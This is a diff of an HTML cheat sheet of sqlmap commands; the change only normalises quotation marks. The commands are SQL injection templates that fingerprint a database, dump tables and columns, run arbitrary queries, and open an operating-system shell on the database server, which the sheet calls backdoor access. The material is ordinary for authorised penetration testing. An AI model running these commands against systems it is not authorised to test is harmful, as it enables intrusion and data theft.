@@ -14,7 +14,7 @@
 </head>
 <body>
 <h1 id="test-url-and-post-data-and-return-database-banner-if-possible">Test URL and POST data and return database banner (if possible)</h1>
-<p>./sqlmap.py –url=“<url>” –data=“<post-data>” –banner</p>
+<p>./sqlmap.py –url="<url>” –data="<post-data>” –banner</p>
 <h1 id="parse-request-data-and-test-request-data-can-be-obtained-with-burp">Parse request data and test | request data can be obtained with burp</h1>
 <p>./sqlmap.py -r <request-file> <options></p>
 <h1 id="fingerprint-much-more-information-than-banner">Fingerprint | much more information than banner</h1>
@@ -36,9 +36,9 @@
 <h1 id="extract-data">Extract data</h1>
 <p>./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> –dump</p>
 <h1 id="execute-sql-query">Execute SQL Query</h1>
-<p>./sqlmap.py -r <request-file> –sql-query=“<sql-query>”</p>
+<p>./sqlmap.py -r <request-file> –sql-query="<sql-query>”</p>
 <h1 id="appendprepend-sql-queries">Append/Prepend SQL Queries</h1>
-<p>./sqlmap.py -r <request-file> –prefix=“<sql-query>” –suffix=“<sql-query>”</p>
+<p>./sqlmap.py -r <request-file> –prefix="<sql-query>” –suffix="<sql-query>”</p>
 <h1 id="get-backdoor-access-to-sql-server-can-give-shell-access">Get backdoor access to sql server | can give shell access</h1>
 <p>./sqlmap.py -r <request-file> –os-shell</p>
 </body>
